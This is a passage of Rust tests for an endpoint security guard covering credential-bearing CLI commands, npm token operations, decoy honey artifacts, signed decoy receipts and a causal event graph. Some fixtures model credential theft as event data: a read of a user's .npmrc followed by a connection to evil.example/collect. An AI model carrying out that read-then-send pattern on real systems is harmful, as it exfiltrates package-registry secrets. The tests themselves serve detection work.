                "drone",
            ),
            (
                "/opt/homebrew/bin/sem",
                vec!["secret", "create", "DATABASE_URL", "--value", "redacted"],
                "SEMAPHORE_API_TOKEN",
                "semaphore",
            ),
            (
                "/usr/local/bin/appveyor",
                vec!["encrypt", "--secret", "deploy-key"],
                "APPVEYOR_API_TOKEN",
                "appveyor",
            ),
            (
                "/usr/local/bin/woodpecker",
                vec!["secret", "list", "--repository", "acme/service"],
                "WOODPECKER_TOKEN",
                "woodpecker",
            ),
            (
                "/usr/local/bin/codefresh",
                vec!["auth", "create-token", "--scope", "pipeline:run"],
                "CODEFRESH_API_KEY",
                "codefresh",
            ),
            (
                "/opt/homebrew/bin/terraform",
                vec!["output", "-json"],
                "TF_TOKEN_app_terraform_io",
                "terraform",
            ),
            (
                "/opt/homebrew/bin/terragrunt",
                vec!["state", "pull"],
                "TERRAFORM_TOKEN",
                "terragrunt",
            ),
            (
                "/opt/homebrew/bin/tofu",
                vec!["show", "-json"],
                "TFE_TOKEN",
                "opentofu",
            ),
        ];

        for (image, args, env_key, expected_cli) in cases {
            let mut env = BTreeMap::new();
            env.insert(env_key.to_string(), "redacted".to_string());
            let event = observation(EndpointEvent::ProcessExec {
                image: image.to_string(),
                args: args.into_iter().map(str::to_string).collect(),
                env,
            });

            let findings = guard.evaluate(&event);

            let finding = findings
                .iter()
                .find(|finding| finding.rule_id == "supply_chain.cloud_cli_sensitive_operation")
                .unwrap_or_else(|| {
                    panic!("missing sensitive CLI operation finding for {expected_cli}")
                });
            assert!(
                finding
                    .evidence
                    .iter()
                    .any(|item| item.key == "cloudCli" && item.value == expected_cli),
                "missing cloudCli evidence for {expected_cli}"
            );
            assert!(
                finding
                    .evidence
                    .iter()
                    .any(|item| item.key == "credentialEnvKeys" && item.value.contains(env_key)),
                "missing credential environment evidence for {expected_cli}"
            );
        }
    }

    #[test]
    fn supply_chain_guard_flags_package_registry_token_cli_operations() {
        let guard = SupplyChainRuntimeGuard::new();
        let mut env = BTreeMap::new();
        env.insert("NODE_AUTH_TOKEN".to_string(), "redacted".to_string());
        let event = observation(EndpointEvent::ProcessExec {
            image: "/usr/local/bin/npm".to_string(),
            args: vec![
                "token".to_string(),
                "list".to_string(),
                "--json".to_string(),
            ],
            env,
        });

        let findings = guard.evaluate(&event);

        let finding = findings
            .iter()
            .find(|finding| finding.rule_id == "supply_chain.package_registry_token_operation")
            .unwrap_or_else(|| panic!("missing package registry token operation finding"));
        assert!(finding
            .evidence
            .iter()
            .any(|item| item.key == "packageManager" && item.value == "npm"));
        assert!(finding
            .evidence
            .iter()
            .any(|item| item.key == "packageRegistryRisk"
                && item.value.contains("npm authentication tokens")));
        assert!(finding
            .evidence
            .iter()
            .any(|item| item.key == "credentialEnvKeys" && item.value.contains("NODE_AUTH_TOKEN")));
    }

    #[test]
    fn deception_plan_materializes_without_overwriting_and_detects_access() {
        let root = temp_root();
        let plan = DeceptionPlan::standard(&root, "endpoint-a");

        let first = plan.materialize().unwrap();
        let second = plan.materialize().unwrap();

        assert_eq!(first.created.len(), plan.artifacts.len());
        assert_eq!(second.skipped.len(), plan.artifacts.len());

        let artifact = plan
            .artifacts
            .iter()
            .find(|artifact| artifact.kind == HoneyArtifactKind::SshPrivateKey)
            .unwrap();
        let guard = SupplyChainRuntimeGuard::with_honey_artifacts(plan.artifacts.clone());
        let event = observation(EndpointEvent::FileAccess {
            operation: FileOperation::Read,
            path: artifact.absolute_path(&root).display().to_string(),
            source_url: None,
            content_preview: None,
        });

        let findings = guard.evaluate(&event);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "deception.honey_artifact_touched");

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn deception_and_detection_metadata_deserialization_rejects_unknown_fields() {
        let root = temp_root();
        let plan = DeceptionPlan::standard(&root, "endpoint-a");
        let artifact = plan.artifacts[0].clone();
        let guard = SupplyChainRuntimeGuard::with_honey_artifacts(plan.artifacts.clone());
        let materialization_report = DeceptionMaterializationReport {
            created: plan
                .artifacts
                .iter()
                .map(|artifact| artifact.absolute_path(&root).display().to_string())
                .collect(),
            skipped: Vec::new(),
        };
        let cleanup_report = DeceptionCleanupReport {
            dry_run: false,
            removed: materialization_report.created.clone(),
            would_remove: Vec::new(),
            missing: Vec::new(),
            refused: Vec::new(),
        };
        let rotation_report = DeceptionRotationReport {
            dry_run: false,
            cleanup: cleanup_report.clone(),
            materialization: Some(materialization_report.clone()),
            deregistered_artifact_count: plan.artifacts.len(),
            registered_artifact_count: plan.artifacts.len(),
            remaining_registered_artifact_count: plan.artifacts.len(),
        };
        let detection = DetectionFinding {
            finding_id: "finding:test".to_string(),
            rule_id: "deception.honey_artifact_touched".to_string(),
            title: "Honey artifact touched".to_string(),
            severity: DetectionSeverity::High,
            confidence: 0.99,
            description: "A honey artifact was accessed".to_string(),
            observation_id: "obs:test".to_string(),
            timestamp: Utc::now(),
            evidence: vec![DetectionEvidence {
                key: "artifactId".to_string(),
                value: artifact.artifact_id.clone(),
            }],
            mitre_attack: vec!["T1552".to_string()],
            tags: vec!["deception".to_string()],
            remediation: "Review causal graph".to_string(),
        };

        assert_unknown_field_rejected::<SupplyChainRuntimeGuard>(
            serde_json::to_value(&guard).unwrap(),
            "shadowHoneyArtifacts",
        );
        assert_unknown_field_rejected::<HoneyArtifact>(
            serde_json::to_value(&artifact).unwrap(),
            "shadowMarker",
        );
        assert_unknown_field_rejected::<DeceptionPlan>(
            serde_json::to_value(&plan).unwrap(),
            "shadowRoot",
        );
        assert_unknown_field_rejected::<DeceptionMaterializationReport>(
            serde_json::to_value(&materialization_report).unwrap(),
            "shadowCreated",
        );
        assert_unknown_field_rejected::<DeceptionCleanupReport>(
            serde_json::to_value(&cleanup_report).unwrap(),
            "shadowRemoved",
        );
        assert_unknown_field_rejected::<DeceptionRotationReport>(
            serde_json::to_value(&rotation_report).unwrap(),
            "shadowRotation",
        );
        assert_unknown_field_rejected::<DetectionEvidence>(
            serde_json::to_value(&detection.evidence[0]).unwrap(),
            "shadowEvidenceValue",
        );
        assert_unknown_field_rejected::<DetectionFinding>(
            serde_json::to_value(&detection).unwrap(),
            "shadowFinding",
        );

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn deception_plan_detects_honey_hostname_network_flow() {
        let root = temp_root();
        let plan = DeceptionPlan::standard(&root, "endpoint-a");
        let artifact = plan
            .artifacts
            .iter()
            .find(|artifact| artifact.kind == HoneyArtifactKind::InternalHostname)
            .unwrap();
        let honey_host = artifact.internal_hostname().unwrap().to_string();
        let guard = SupplyChainRuntimeGuard::with_honey_artifacts(plan.artifacts.clone());
        let event = observation(EndpointEvent::NetworkFlow {
            host: honey_host.clone(),
            port: 443,
            protocol: Some("https".to_string()),
            url: Some(format!("https://{honey_host}/admin")),
        });

        let findings = guard.evaluate(&event);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "deception.honey_artifact_touched");
        assert!(findings[0]
            .evidence
            .iter()
            .any(|item| item.key == "matchType" && item.value == "network_destination"));

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn deception_plan_detects_honey_hostname_dns_lookup() {
        let root = temp_root();
        let plan = DeceptionPlan::standard(&root, "endpoint-a");
        let artifact = plan
            .artifacts
            .iter()
            .find(|artifact| artifact.kind == HoneyArtifactKind::InternalHostname)
            .unwrap();
        let honey_host = artifact.internal_hostname().unwrap().to_string();
        let guard = SupplyChainRuntimeGuard::with_honey_artifacts(plan.artifacts.clone());
        let event = observation(EndpointEvent::DnsLookup {
            query: honey_host.clone(),
            record_type: Some("A".to_string()),
            answers: vec!["10.10.10.10".to_string()],
            resolver: Some("10.0.0.53".to_string()),
            status: Some("noerror".to_string()),
        });

        let findings = guard.evaluate(&event);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "deception.honey_artifact_touched");
        assert!(findings[0]
            .evidence
            .iter()
            .any(|item| item.key == "matchType" && item.value == "dns_query"));

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn deception_plan_detects_browser_cookie_honey_value() {
        let root = temp_root();
        let plan = DeceptionPlan::standard(&root, "endpoint-a");
        let artifact = plan
            .artifacts
            .iter()
            .find(|artifact| artifact.kind == HoneyArtifactKind::BrowserCookieJar)
            .unwrap();
        let guard = SupplyChainRuntimeGuard::with_honey_artifacts(plan.artifacts.clone());
        let event = observation(EndpointEvent::CredentialAccess {
            kind: CredentialKind::BrowserCookie,
            path: None,
            name: Some(format!("intranet.invalid/session={}", artifact.marker)),
        });

        let findings = guard.evaluate(&event);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "deception.honey_artifact_touched");
        assert!(findings[0]
            .evidence
            .iter()
            .any(|item| item.key == "matchType" && item.value == "browser_cookie"));

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn endpoint_deception_materialization_receipt_binds_plan_and_report() {
        let root = temp_root();
        let plan = DeceptionPlan::standard(&root, "endpoint-a");
        let report = DeceptionMaterializationReport {
            created: plan
                .artifacts
                .iter()
                .map(|artifact| artifact.absolute_path(&root).display().to_string())
                .collect(),
            skipped: Vec::new(),
        };
        let keypair = hush_core::Keypair::from_seed(&[44u8; 32]);
        let mut receipt = EndpointDecisionReceipt::for_deception_materialization(
            EndpointDeceptionMaterializationReceiptInput {
                local_sequence: 44,
                endpoint_id: "endpoint-a",
                signer_identity: "local-edr:endpoint-a",
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                plan: &plan,
                report: &report,
                registered_artifact_count: plan.artifacts.len(),
            },
        );
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::DeceptionMaterialization
        );
        assert_eq!(receipt.decision.action, EndpointDecisionAction::Observe);
        assert!(receipt.decision.passed);
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "deceptionPlanHash"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "materializationReportHash"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "registeredArtifactCount"));

        let mut relabeled_plan_root = receipt.clone();
        if let Some(plan_root_evidence) = relabeled_plan_root
            .evidence
            .iter_mut()
            .find(|item| item.key == "deceptionPlanRoot")
        {
            *plan_root_evidence =
                EndpointReceiptEvidence::hashed("deceptionPlanRoot", "/tmp/other-plan-root");
        }
        assert!(relabeled_plan_root
            .validate()
            .unwrap_err()
            .to_string()
            .contains("deception materialization id"));

        let mut relabeled_artifact_ids = receipt.clone();
        if let Some(artifact_ids_evidence) = relabeled_artifact_ids
            .evidence
            .iter_mut()
            .find(|item| item.key == "artifactIds")
        {
            *artifact_ids_evidence = EndpointReceiptEvidence::hashed("artifactIds", "honey:other");
        }
        assert!(relabeled_artifact_ids
            .validate()
            .unwrap_err()
            .to_string()
            .contains("deception materialization id"));

        let mut mismatched_endpoint = receipt.clone();
        if let Some(endpoint_evidence) = mismatched_endpoint
            .evidence
            .iter_mut()
            .find(|item| item.key == "endpointId")
        {
            *endpoint_evidence = EndpointReceiptEvidence::hashed("endpointId", "endpoint-other");
        }
        assert!(mismatched_endpoint
            .validate()
            .unwrap_err()
            .to_string()
            .contains("deception materialization endpoint evidence hash"));

        let mut missing_artifact_count = receipt.clone();
        missing_artifact_count
            .evidence
            .retain(|item| item.key != "artifactCount");
        assert!(missing_artifact_count
            .validate()
            .unwrap_err()
            .to_string()
            .contains("deception materialization artifact count evidence"));

        let mut relabeled_materialization_id = receipt.clone();
        relabeled_materialization_id.decision.finding_id =
            Some("deception_materialization:other".to_string());
        assert!(relabeled_materialization_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("deception materialization id"));

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn endpoint_deception_cleanup_receipt_binds_plan_and_report() {
        let root = temp_root();
        let plan = DeceptionPlan::standard(&root, "endpoint-a");
        let report = DeceptionCleanupReport {
            dry_run: false,
            removed: plan
                .artifacts
                .iter()
                .map(|artifact| artifact.absolute_path(&root).display().to_string())
                .collect(),
            would_remove: Vec::new(),
            missing: Vec::new(),
            refused: Vec::new(),
        };
        let keypair = hush_core::Keypair::from_seed(&[45u8; 32]);
        let mut receipt =
            EndpointDecisionReceipt::for_deception_cleanup(EndpointDeceptionCleanupReceiptInput {
                local_sequence: 45,
                endpoint_id: "endpoint-a",
                signer_identity: "local-edr:endpoint-a",
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                plan: &plan,
                report: &report,
                deregistered_artifact_count: plan.artifacts.len(),
                remaining_registered_artifact_count: 0,
            });
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::DeceptionCleanup
        );
        assert_eq!(receipt.decision.action, EndpointDecisionAction::Observe);
        assert!(receipt.decision.passed);
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "deceptionPlanHash"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "cleanupReportHash"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "removedCount"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "deregisteredArtifactCount"));

        let mut relabeled_plan_root = receipt.clone();
        if let Some(plan_root_evidence) = relabeled_plan_root
            .evidence
            .iter_mut()
            .find(|item| item.key == "deceptionPlanRoot")
        {
            *plan_root_evidence =
                EndpointReceiptEvidence::hashed("deceptionPlanRoot", "/tmp/other-plan-root");
        }
        assert!(relabeled_plan_root
            .validate()
            .unwrap_err()
            .to_string()
            .contains("deception cleanup id"));

        let mut mismatched_dry_run = receipt.clone();
        if let Some(dry_run_evidence) = mismatched_dry_run
            .evidence
            .iter_mut()
            .find(|item| item.key == "dryRun")
        {
            *dry_run_evidence = EndpointReceiptEvidence::hashed("dryRun", "true");
        }
        assert!(mismatched_dry_run
            .validate()
            .unwrap_err()
            .to_string()
            .contains("deception cleanup dry-run evidence hash"));

        let mut mismatched_endpoint = receipt.clone();
        if let Some(endpoint_evidence) = mismatched_endpoint
            .evidence
            .iter_mut()
            .find(|item| item.key == "endpointId")
        {
            *endpoint_evidence = EndpointReceiptEvidence::hashed("endpointId", "endpoint-other");
        }
        assert!(mismatched_endpoint
            .validate()
            .unwrap_err()
            .to_string()
            .contains("deception cleanup endpoint evidence hash"));

        let mut missing_cleanup_report = receipt.clone();
        missing_cleanup_report
            .evidence
            .retain(|item| item.key != "cleanupReportHash");
        assert!(missing_cleanup_report
            .validate()
            .unwrap_err()
            .to_string()
            .contains("deception cleanup report hash evidence"));

        let mut inconsistent_refused_count = receipt.clone();
        if let Some(refused_count) = inconsistent_refused_count
            .evidence
            .iter_mut()
            .find(|item| item.key == "refusedCount")
        {
            *refused_count = EndpointReceiptEvidence::hashed("refusedCount", "1");
        }
        assert!(inconsistent_refused_count
            .validate()
            .unwrap_err()
            .to_string()
            .contains("deception cleanup refused count evidence hash"));

        let mut relabeled_removed_count = receipt.clone();
        if let Some(removed_count) = relabeled_removed_count
            .evidence
            .iter_mut()
            .find(|item| item.key == "removedCount")
        {
            *removed_count = EndpointReceiptEvidence::hashed("removedCount", "0");
        }
        assert!(relabeled_removed_count
            .validate()
            .unwrap_err()
            .to_string()
            .contains("deception cleanup id"));

        let mut relabeled_cleanup_id = receipt.clone();
        relabeled_cleanup_id.decision.finding_id = Some("deception_cleanup:other".to_string());
        assert!(relabeled_cleanup_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("deception cleanup id"));

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn endpoint_deception_rotation_receipt_binds_old_and_new_plans() {
        let root = temp_root();
        let old_plan = DeceptionPlan::standard(&root, "endpoint-a-old");
        let new_plan = DeceptionPlan::standard(&root, "endpoint-a-new");
        let report = DeceptionRotationReport {
            dry_run: false,
            cleanup: DeceptionCleanupReport {
                dry_run: false,
                removed: old_plan
                    .artifacts
                    .iter()
                    .map(|artifact| artifact.absolute_path(&root).display().to_string())
                    .collect(),
                would_remove: Vec::new(),
                missing: Vec::new(),
                refused: Vec::new(),
            },
            materialization: Some(DeceptionMaterializationReport {
                created: new_plan
                    .artifacts
                    .iter()
                    .map(|artifact| artifact.absolute_path(&root).display().to_string())
                    .collect(),
                skipped: Vec::new(),
            }),
            deregistered_artifact_count: old_plan.artifacts.len(),
            registered_artifact_count: new_plan.artifacts.len(),
            remaining_registered_artifact_count: new_plan.artifacts.len(),
        };
        let keypair = hush_core::Keypair::from_seed(&[46u8; 32]);
        let mut receipt = EndpointDecisionReceipt::for_deception_rotation(
            EndpointDeceptionRotationReceiptInput {
                local_sequence: 46,
                endpoint_id: "endpoint-a",
                signer_identity: "local-edr:endpoint-a",
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                old_plan: &old_plan,
                new_plan: &new_plan,
                report: &report,
            },
        );
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::DeceptionRotation
        );
        assert_eq!(receipt.decision.action, EndpointDecisionAction::Observe);
        assert!(receipt.decision.passed);
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "oldDeceptionPlanHash"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "newDeceptionPlanHash"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "rotationReportHash"));

        let mut relabeled_old_plan_root = receipt.clone();
        if let Some(plan_root_evidence) = relabeled_old_plan_root
            .evidence
            .iter_mut()
            .find(|item| item.key == "oldDeceptionPlanRoot")
        {
            *plan_root_evidence =
                EndpointReceiptEvidence::hashed("oldDeceptionPlanRoot", "/tmp/other-old-plan");
        }
        assert!(relabeled_old_plan_root
            .validate()
            .unwrap_err()
            .to_string()
            .contains("deception rotation id"));

        let mut mismatched_dry_run = receipt.clone();
        if let Some(dry_run_evidence) = mismatched_dry_run
            .evidence
            .iter_mut()
            .find(|item| item.key == "dryRun")
        {
            *dry_run_evidence = EndpointReceiptEvidence::hashed("dryRun", "true");
        }
        assert!(mismatched_dry_run
            .validate()
            .unwrap_err()
            .to_string()
            .contains("deception rotation dry-run evidence hash"));

        let mut mismatched_endpoint = receipt.clone();
        if let Some(endpoint_evidence) = mismatched_endpoint
            .evidence
            .iter_mut()
            .find(|item| item.key == "endpointId")
        {
            *endpoint_evidence = EndpointReceiptEvidence::hashed("endpointId", "endpoint-other");
        }
        assert!(mismatched_endpoint
            .validate()
            .unwrap_err()
            .to_string()
            .contains("deception rotation endpoint evidence hash"));

        let mut missing_rotation_report = receipt.clone();
        missing_rotation_report
            .evidence
            .retain(|item| item.key != "rotationReportHash");
        assert!(missing_rotation_report
            .validate()
            .unwrap_err()
            .to_string()
            .contains("deception rotation report hash evidence"));

        let mut inconsistent_refused_count = receipt.clone();
        if let Some(refused_count) = inconsistent_refused_count
            .evidence
            .iter_mut()
            .find(|item| item.key == "cleanupRefusedCount")
        {
            *refused_count = EndpointReceiptEvidence::hashed("cleanupRefusedCount", "1");
        }
        assert!(inconsistent_refused_count
            .validate()
            .unwrap_err()
            .to_string()
            .contains("deception rotation cleanup refused count evidence hash"));

        let mut relabeled_cleanup_removed_count = receipt.clone();
        if let Some(removed_count) = relabeled_cleanup_removed_count
            .evidence
            .iter_mut()
            .find(|item| item.key == "cleanupRemovedCount")
        {
            *removed_count = EndpointReceiptEvidence::hashed("cleanupRemovedCount", "0");
        }
        assert!(relabeled_cleanup_removed_count
            .validate()
            .unwrap_err()
            .to_string()
            .contains("deception rotation id"));

        let mut relabeled_rotation_id = receipt.clone();
        relabeled_rotation_id.decision.finding_id = Some("deception_rotation:other".to_string());
        assert!(relabeled_rotation_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("deception rotation id"));

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn causal_graph_links_process_to_file_secret_and_network() {
        let mut recorder = CausalGraphRecorder::new();

        let file = observation(EndpointEvent::FileAccess {
            operation: FileOperation::Read,
            path: "/Users/alice/.npmrc".to_string(),
            source_url: None,
            content_preview: None,
        });
        let mut network = observation(EndpointEvent::NetworkFlow {
            host: "evil.example".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: Some("https://evil.example/collect".to_string()),
        });
        network.observation_id = "network-1".to_string();

        let file_nodes = recorder.record_observation(&file);
        let network_nodes = recorder.record_observation(&network);
        let graph = recorder.graph();

        assert!(graph.nodes.len() >= 3);
        assert!(graph
            .edges
            .iter()
            .any(|edge| edge.kind == CausalEdgeKind::Read));
        assert!(graph
            .edges
            .iter()
            .any(|edge| edge.kind == CausalEdgeKind::Connected));

        let file_node = file_nodes.last().unwrap();
        let network_node = network_nodes.last().unwrap();
        let path = recorder.causal_path(file_node, network_node).unwrap();
        assert_eq!(path.first().unwrap(), file_node);
        assert_eq!(path.last().unwrap(), network_node);
    }

    #[test]
    fn causal_graph_links_process_to_dns_lookup() {
        let mut recorder = CausalGraphRecorder::new();
        let dns = observation(EndpointEvent::DnsLookup {
            query: "packages.example.invalid".to_string(),
            record_type: Some("A".to_string()),
            answers: vec!["192.0.2.10".to_string()],
            resolver: Some("10.0.0.53".to_string()),
            status: Some("noerror".to_string()),
        });

        let nodes = recorder.record_observation(&dns);
        let graph = recorder.graph();

        let dns_node_id = nodes.last().unwrap();
        let dns_node = graph
            .nodes
            .get(dns_node_id)
            .unwrap_or_else(|| panic!("missing DNS graph node"));
        assert_eq!(dns_node.kind, CausalNodeKind::DnsName);
        assert_eq!(dns_node.label, "packages.example.invalid");
        assert_eq!(dns_node.attributes["recordType"], "A");
        assert_eq!(dns_node.attributes["answers"][0], "192.0.2.10");
        assert!(graph
            .edges
            .iter()
            .any(|edge| edge.kind == CausalEdgeKind::ResolvedDns));
    }

    #[test]
    fn causal_graph_promotes_identity_context_to_attribution_nodes() {
        let mut recorder = CausalGraphRecorder::new();
        let mut metadata = BTreeMap::new();
        metadata.insert(
            "agentId".to_string(),
            serde_json::Value::String("agent:codex".to_string()),
        );
        metadata.insert(
            "workloadId".to_string(),
            serde_json::Value::String("spiffe://example.test/workload/codex".to_string()),
        );
        metadata.insert(
            "approvalId".to_string(),
            serde_json::Value::String("approval-123".to_string()),
        );
        metadata.insert(
            "posture".to_string(),
            serde_json::Value::String("managed".to_string()),
        );
        let mut network = observation(EndpointEvent::NetworkFlow {
            host: "api.example.test".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: Some("https://api.example.test/upload".to_string()),
        });
        network.host_id = Some("host-1".to_string());
        network.user_id = Some("alice".to_string());
        network.session_id = Some("session-identity-1".to_string());
        network.metadata = metadata;

        let nodes = recorder.record_observation(&network);
        let graph = recorder.graph();

        assert!(nodes.len() >= 8);
        assert!(graph
            .nodes
            .values()
            .any(|node| node.kind == CausalNodeKind::Host && node.label == "host-1"));
        assert!(graph
            .nodes
            .values()
            .any(|node| node.kind == CausalNodeKind::User && node.label == "alice"));
        assert!(graph.nodes.values().any(|node| {
            node.kind == CausalNodeKind::Session
                && node.label == "session-identity-1"
                && node
                    .attributes
                    .get("posture")
                    .and_then(serde_json::Value::as_str)
                    == Some("managed")
        }));
        assert!(graph
            .nodes
            .values()
            .any(|node| node.kind == CausalNodeKind::Agent && node.label == "agent:codex"));
        assert!(graph.nodes.values().any(|node| {
            node.kind == CausalNodeKind::Workload
                && node.label == "spiffe://example.test/workload/codex"
        }));
        assert!(graph
            .nodes
            .values()
            .any(|node| node.kind == CausalNodeKind::Approval && node.label == "approval-123"));
        for kind in [
            CausalEdgeKind::ObservedOn,
            CausalEdgeKind::RanAs,
            CausalEdgeKind::InSession,
            CausalEdgeKind::UsedAgent,
            CausalEdgeKind::UsedWorkload,
            CausalEdgeKind::AuthorizedBy,
        ] {
            assert!(graph.edges.iter().any(|edge| edge.kind == kind));
        }

        let agent_node_id = graph
            .nodes
            .values()
            .find(|node| node.kind == CausalNodeKind::Agent)
            .map(|node| node.node_id.clone())
            .unwrap_or_else(|| panic!("missing agent attribution node"));
        let network_node_id = graph
            .nodes
            .values()
            .find(|node| node.kind == CausalNodeKind::Network)
            .map(|node| node.node_id.clone())
            .unwrap_or_else(|| panic!("missing network node"));
        let path = recorder
            .causal_path(&agent_node_id, &network_node_id)
            .unwrap_or_else(|| panic!("missing agent-to-network causal path"));
        assert_eq!(path.first().unwrap(), &agent_node_id);
        assert_eq!(path.last().unwrap(), &network_node_id);
    }

    #[test]
    fn causal_graph_exports_subgraph_for_process_cause_query() {
        let mut recorder = CausalGraphRecorder::new();
        let file = observation(EndpointEvent::FileAccess {
            operation: FileOperation::Read,
            path: "/Users/alice/.npmrc".to_string(),
            source_url: None,
            content_preview: None,
        });
        let mut network = observation(EndpointEvent::NetworkFlow {
            host: "evil.example".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: Some("https://evil.example/collect".to_string()),
        });
        network.observation_id = "network-subgraph-1".to_string();

        recorder.record_observation(&file);
        recorder.record_observation(&network);
        let process_node_id = file.process.stable_node_id();
        let subgraph = recorder
            .graph()
            .causal_subgraph_from(&process_node_id, 3)
            .unwrap();

        assert!(subgraph.nodes.contains_key(&process_node_id));
        assert!(subgraph
            .edges
            .iter()
            .any(|edge| edge.kind == CausalEdgeKind::Read));
        assert!(subgraph
            .edges
            .iter()
            .any(|edge| edge.kind == CausalEdgeKind::Connected));
        assert!(subgraph
            .nodes
            .values()
            .any(|node| node.label == ".npmrc" || node.label == "/Users/alice/.npmrc"));
        assert!(subgraph
            .nodes
            .values()
            .any(|node| node.label == "evil.example:443"));
    }

    #[test]
    fn causal_graph_exports_upstream_and_downstream_context() {
        let mut recorder = CausalGraphRecorder::new();
        let file = observation(EndpointEvent::FileAccess {
            operation: FileOperation::Read,
            path: "/Users/alice/.npmrc".to_string(),
            source_url: None,
            content_preview: None,
        });
        let mut network = observation(EndpointEvent::NetworkFlow {
            host: "evil.example".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: Some("https://evil.example/collect".to_string()),
        });
        network.observation_id = "network-context-1".to_string();

        recorder.record_observation(&file);
        let network_nodes = recorder.record_observation(&network);
        let network_node_id = network_nodes.last().unwrap();
        let context = recorder
            .graph()
            .causal_context_around(network_node_id, 2, 1)
            .unwrap();

        assert!(context.nodes.contains_key(network_node_id));
        assert!(context
            .edges
            .iter()
            .any(|edge| edge.kind == CausalEdgeKind::TemporalNext));
        assert!(context
            .nodes
            .values()
            .any(|node| node.label == ".npmrc" || node.label == "/Users/alice/.npmrc"));
        assert!(context
            .nodes
            .values()
            .any(|node| node.kind == CausalNodeKind::Process));
    }

    #[test]
    fn policy_event_converts_to_endpoint_observation() {
        let event = PolicyEvent {
            event_id: "policy-1".to_string(),
            event_type: PolicyEventType::NetworkEgress,
            timestamp: Utc::now(),
            session_id: Some("session".to_string()),
            data: PolicyEventData::Network(NetworkEventData {
                host: "api.example.com".to_string(),
                port: 443,
                protocol: Some("tcp".to_string()),
                url: Some("https://api.example.com/v1".to_string()),
            }),
            metadata: Some(serde_json::json!({
                "endpointId": "endpoint-policy-1",
                "principalId": "principal-policy-1",
                "endpointAgentId": "agent-policy-1",
                "workload_identity": "spiffe://example.test/workload/policy-1",
                "approval_id": "approval-policy-1",
                "process": {
                    "pid": 9,
                    "image": "/usr/bin/python3",
                    "commandLine": "python3 script.py"
                }
            })),
            context: Some(serde_json::json!({
                "endpoint_id": "endpoint-context-should-not-win",
                "principalId": "principal-context-should-not-win"
            })),
        };

        let observation = EndpointObservation::from_policy_event(&event);

        assert_eq!(observation.observation_id, "policy-1");
        assert_eq!(observation.host_id.as_deref(), Some("endpoint-policy-1"));
        assert_eq!(observation.user_id.as_deref(), Some("principal-policy-1"));
        assert_eq!(observation.process.pid, Some(9));
        match &observation.event {
            EndpointEvent::NetworkFlow { host, port, .. } => {
                assert_eq!(host, "api.example.com");
                assert_eq!(*port, 443);
            }
            other => panic!("unexpected event: {other:?}"),
        }

        let actor = EndpointDecisionActor::from_observation("endpoint-policy-1", &observation);
        assert_eq!(actor.agent_id.as_deref(), Some("agent-policy-1"));
        assert_eq!(
            actor.workload_id.as_deref(),
            Some("spiffe://example.test/workload/policy-1")
        );
        assert_eq!(actor.approval_id.as_deref(), Some("approval-policy-1"));

        let mut recorder = CausalGraphRecorder::new();
        let touched_nodes = recorder.record_observation(&observation);
        let process_node = recorder
            .graph()
            .nodes
            .get(&touched_nodes[0])
            .unwrap_or_else(|| panic!("missing process node"));
        assert_eq!(process_node.attributes["agentId"], "agent-policy-1");
        assert_eq!(
            process_node.attributes["workloadId"],
            "spiffe://example.test/workload/policy-1"
        );
        assert_eq!(process_node.attributes["approvalId"], "approval-policy-1");
    }

    #[test]
    fn policy_event_context_identity_converts_to_endpoint_observation() {
        let event = PolicyEvent {
